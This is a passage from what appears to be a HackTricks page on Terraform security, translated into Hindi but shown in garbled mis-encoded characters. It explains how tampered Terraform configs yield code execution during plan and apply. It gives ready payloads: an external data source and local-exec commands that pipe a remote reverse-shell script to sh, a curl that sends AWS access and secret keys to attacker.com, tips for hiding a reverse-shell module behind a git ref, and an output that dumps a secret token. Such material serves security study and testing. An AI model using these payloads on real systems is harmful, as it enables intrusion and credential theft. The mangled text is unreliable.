# рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд╕реБрд░рдХреНрд╖рд╛

<details>

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform рдПрдХ **рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЛрдб рдЙрдкрдХрд░рдг** рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдорд╛рдирд╡-рдкрдардиреАрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ **рдХреНрд▓рд╛рдЙрдб рдФрд░ рдСрди-рдкреНрд░реЗрдо рд╕рдВрд╕рд╛рдзрдиреЛрдВ** рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рджреЗрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рд╕рдВрд╕реНрдХрд░рдг, рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдФрд░ рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдлрд┐рд░ рдПрдХ рд╕рдВрд░рдЪрд┐рдд рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЕрдкрдиреЗ рд╕рднреА рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХрд╛ рдкреНрд░рд╛рд╡рдзрд╛рди рдФрд░ рдкреНрд░рдмрдВрдзрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдирд┐рдореНрди рд╕реНрддрд░реАрдп рдШрдЯрдХреЛрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрдВрдкреНрдпреВрдЯ, рд╕реНрдЯреЛрд░реЗрдЬ, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд╕рдВрд╕рд╛рдзрди, рд╕рд╛рде рд╣реА DNS рдПрдВрдЯреНрд░реАрдЬ рдФрд░ SaaS рд╕реБрд╡рд┐рдзрд╛рдПрдБ рдЬреИрд╕реЗ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдШрдЯрдХреЛрдВ рдХрд╛ рднреАред

### рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ?

рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреНрд▓рд╛рдЙрдб рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдореЛрдВ рдФрд░ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рд╕рдВрд╕рд╛рдзрди рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЙрдирдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдЗрдВрдЯрд░рдлреЗрд╕ (APIs) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред рдкреНрд░рджрд╛рддрд╛рдПрдБ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреЛ рд▓рдЧрднрдЧ рдХрд┐рд╕реА рднреА рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдпрд╛ рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВред

![](<../.gitbook/assets/image (177).png>)

HashiCorp рдФрд░ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд╕рдореБрджрд╛рдп рдиреЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **1700 рд╕реЗ рдЕрдзрд┐рдХ рдкреНрд░рджрд╛рддрд╛рдУрдВ** рдХреЛ рд▓рд┐рдЦрд╛ рд╣реИ рдЬреЛ рд╣рдЬрд╛рд░реЛрдВ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВ, рдФрд░ рдпрд╣ рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝рддреА рдЬрд╛ рд░рд╣реА рд╣реИред рдЖрдк рд╕рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЙрдкрд▓рдмреНрдз рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЛ [рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд░рдЬрд┐рд╕реНрдЯреНрд░реА](https://registry.terraform.io/) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдЕрдореЗрдЬрд╝рди рд╡реЗрдм рд╕реЗрд╡рд╛рдПрдБ (AWS), рдПрдЬрд╝реНрдпреВрд░, рдЧреВрдЧрд▓ рдХреНрд▓рд╛рдЙрдб рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо (GCP), рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝, рд╣реЗрд▓реНрдо, рдЧрд┐рдЯрд╣рдм, рд╕реНрдкреНрд▓рдВрдХ, рдбреЗрдЯрд╛рдбреЙрдЧ, рдФрд░ рдмрд╣реБрдд рдХреБрдЫ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

рдореВрд▓ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рддреАрди рдЪрд░рдгреЛрдВ рд╕реЗ рдорд┐рд▓рдХрд░ рдмрдирддрд╛ рд╣реИ:

* **рд▓рд┐рдЦреЗрдВ:** рдЖрдк рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдХрд┐ рдХрдИ рдХреНрд▓рд╛рдЙрдб рдкреНрд░рджрд╛рддрд╛рдУрдВ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдкрд░ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдбрд┐рдкреНрд▓реЙрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣ рдФрд░ рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ рдХреЗ рд╕рд╛рде рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреНрд▓рд╛рдЙрдб (VPC) рдиреЗрдЯрд╡рд░реНрдХ рд╣реЛред
* **рдпреЛрдЬрдирд╛:** рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЬрдирд╛ рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреА рдореМрдЬреВрджрд╛ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдФрд░ рдЖрдкрдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрдХрд░ рдЙрд╕ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛ рдмрдирд╛рдПрдЧрд╛, рдЕрдкрдбреЗрдЯ рдХрд░реЗрдЧрд╛, рдпрд╛ рдирд╖реНрдЯ рдХрд░реЗрдЧрд╛ред
* **рд▓рд╛рдЧреВ рдХрд░реЗрдВ:** рдордВрдЬреВрд░реА рдкрд░, рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд╕рд╣реА рдХреНрд░рдо рдореЗрдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдСрдкрд░реЗрд╢рди рдХрд░реЗрдЧрд╛, рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХрд╛ рд╕рдореНрдорд╛рди рдХрд░рддреЗ рд╣реБрдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдк рдПрдХ VPC рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ VPC рдореЗрдВ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдмрджрд▓рддреЗ рд╣реИрдВ, рддреЛ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдкрд╣рд▓реЗ VPC рдХреЛ рдкреБрдирдГ рдмрдирд╛рдПрдЧрд╛ рдлрд┐рд░ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдХреЛ рд╕реНрдХреЗрд▓ рдХрд░реЗрдЧрд╛ред

![](<../.gitbook/assets/image (215).png>)

## рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд▓реИрдм

рдЕрдкрдиреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдореЗрдВ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВред

рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ [рдЧрд╛рдЗрдб](https://learn.hashicorp.com/tutorials/terraform/install-cli) рд╣реИ рдФрд░ рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ [рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛](https://www.terraform.io/downloads) рд╣реИред

## рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдореЗрдВ RCE

рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо **рдХрд┐рд╕реА рднреА рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЛ рдПрдХ рд╡реЗрдм рдкреЗрдЬ рдпрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛ рдЙрдЬрд╛рдЧрд░ рдирд╣реАрдВ рдХрд░рддрд╛**, рдЗрд╕рд▓рд┐рдП, рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░рдиреЗ рдХрд╛ **рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛** рд╣реИ **рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛** рд╣реЛрдирд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдПрдХ **рдмрд╣реБрдд рд╣реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдШрдЯрдХ** рд╣реИ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рдкрд╛рд╕ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдкрд╣реБрдВрдЪ** рд╣реЛрддреА рд╣реИ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рддрдХ рддрд╛рдХрд┐ рдпрд╣ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░ рд╕рдХреЗред

рдПрдХ рд╣рдорд▓рд╛рд╡рд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдореБрдЦреНрдп рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд┐рдпреЛрдВ рдХреЛ рд╡рд╣ рд╕рд┐рд╕реНрдЯрдо рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рдЬрд╣рд╛рдБ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдХрд┐рд╕реА рди рдХрд┐рд╕реА рд╕рдордп рд╡реЗ **рд╡реНрдпрд╛рдЦреНрдпрд╛рдд** рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВред

рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рд╡рд╣рд╛рдБ рд╕рдорд╛рдзрд╛рди рд╣реИрдВ рдЬреЛ **PR рдмрдирд╛рдП рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдкреНрд▓рд╛рди/рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ**, рдЬреИрд╕реЗ рдХрд┐ **рдПрдЯрд▓рд╛рдВрдЯрд┐рд╕**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

рдЕрдЧрд░ рдЖрдк рдПрдХ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ рддреЛ рдЖрдк `terraform plan` рдпрд╛ `terraform apply` рдХреЛ рдХрд┐рд╕реА рдиреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдкрд░ RCE рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВред

### рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдкреНрд▓рд╛рди

рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдкреНрд▓рд╛рди рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдореЗрдВ **рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдХрдорд╛рдВрдб** рд╣реИ рдФрд░ рдбреЗрд╡рд▓рдкрд░/рд╕рдорд╛рдзрд╛рди рдЬреЛ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЙрдиреНрд╣реЗрдВ рдЗрд╕реЗ рд╣рд░ рд╕рдордп рдХреЙрд▓ рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП **RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛** рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЬрд╣рд╛рдБ `terraform plan` рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рджреБрд╖рд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВред

#### рдПрдХ рдмрд╛рд╣реНрдп рдкреНрд░рджрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ

рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдПрдХ [`external` рдкреНрд░рджрд╛рддрд╛](https://registry.terraform.io/providers/hashicorp/external/latest/docs) рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### рдПрдХ рдХрд╕реНрдЯрдо рдкреНрд░рджрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ

рдПрдХ рд╣рдорд▓рд╛рд╡рд┐рдорд╛рди рдПрдХ [рдХрд╕реНрдЯрдо рдкреНрд░рджрд╛рддрд╛](https://learn.hashicorp.com/tutorials/terraform/provider-setup) рдХреЛ [рдЯреЗрд░рд╛реЮреЙрд░реНрдо рд░рдЬрд┐рд╕реНрдЯреНрд░реА](https://registry.terraform.io/) рдкрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдХреЛрдб рдореЗрдВ рдЬреЛреЬ рд╕рдХрддрд╛ рд╣реИ рдПрдХ рдлреАрдЪрд░ рдмреНрд░рд╛рдВрдЪ рдореЗрдВ ([рдпрд╣рд╛рдБ рд╕реЗ рдЙрджрд╛рд╣рд░рдг](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
рдкреНрд░рджрд╛рддрд╛ `init` рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрдм `plan` рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХреЛрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк рдПрдХ рдЙрджрд╛рд╣рд░рдг [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

#### рдПрдХ рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╡рд┐рдХрд▓реНрдк рджреЛрдиреЛрдВ рдЙрдкрдпреЛрдЧреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рдмрд╣реБрдд рдЧреБрдкреНрдд (рджреВрд╕рд░рд╛ рдкрд╣рд▓реЗ рд╕реЗ рдЕрдзрд┐рдХ рдЧреБрдкреНрдд рд╣реИ рд▓реЗрдХрд┐рди рдкрд╣рд▓реЗ рд╕реЗ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИ)ред рдЖрдк рдЗрд╕ рд╣рдорд▓рд╛ рднреА рдПрдХ **рдФрд░ рдЧреБрдкреНрдд рддрд░реАрдХреЗ рд╕реЗ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрди рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ:

* рдЯреЗрд░рд╛реЮреЙрд░реНрдо рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд░реЗрд╡ рд╢реИрд▓ рдирд┐рд░реНрджреЗрд╢рд┐рдд рд░реВрдк рд╕реЗ рдЬреЛрдбрд╝рдиреЗ рдХреА рдмрдЬрд╛рдп, рдЖрдк рдПрдХ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рд░реЗрд╡ рд╢реИрд▓ рд╣реИ:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
рдЖрдк [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules) рдореЗрдВ rev shell рдХреЛрдб рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

* рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рдореЗрдВ, **ref** рдлрд╝реАрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ **terraform rev shell рдХреЛрдб рдХреЛ рдЫреБрдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╢рд╛рдЦрд╛** рд░реЗрдкреЛ рдХреЗ рдЕрдВрджрд░, рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply рдХреЛ рд╕рднреА рдкрд░рд┐рд╡рд░реНрддрди рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг Terraform рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**ред**\
рдЖрдкрдХреЛ рдмрд╕ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдХреБрдЫ рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдХ `main.tf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрддреЗ рд╣реИрдВ:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
рдЕрдкрдирд╛рдПрдВ **рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рд╕реЗ рд╕реБрдЭрд╛рд╡** рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ **рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрднреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЧреБрдкреНрдд рддрд░реАрдХреЗ рд╕реЗ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

## рд░рд╣рд╕реНрдп рдбрдВрдк

рдЖрдк **рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЧреБрдкреНрдд рдорд╛рдиреНрдпрддрд╛рдПрдБ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** `terraform apply` рдЪрд▓рд╛рдХрд░ рдЯреЗрд░реНрд░рд╛рдлреЙрд░реНрдо рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреБрдЫ рдЬреЛрдбрд╝рдХрд░:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform рд╕реНрдерд┐рддрд┐ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

